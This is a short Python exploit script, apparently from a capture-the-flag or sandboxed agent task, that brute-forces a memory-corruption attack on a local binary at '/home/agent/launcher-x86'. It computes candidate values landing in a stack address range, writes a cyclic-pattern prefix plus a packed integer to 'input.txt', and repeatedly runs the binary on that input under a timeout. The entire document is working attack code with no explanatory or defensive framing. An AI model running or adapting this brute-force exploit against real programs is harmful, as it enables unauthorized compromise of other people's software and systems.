import os
import struct

param1 = 0x565581a0
param2 = 0x1d
first = b"Aa0Aa1Aa2Aa3Aa"
end = b"\n"
exe = "/home/agent/launcher-x86"

for i in range(0xffffffff):
  addr = (param2 * i + param1) % 4294967296
  if addr >= 0xfffdd000 and addr < 0xffffe000:
    attempt = struct.pack('<I', i)
    with open("input.txt", "wb") as input_file:
      input_file.write(first + attempt)
    os.system("timeout -k 1s 2s " + exe + " < input.txt")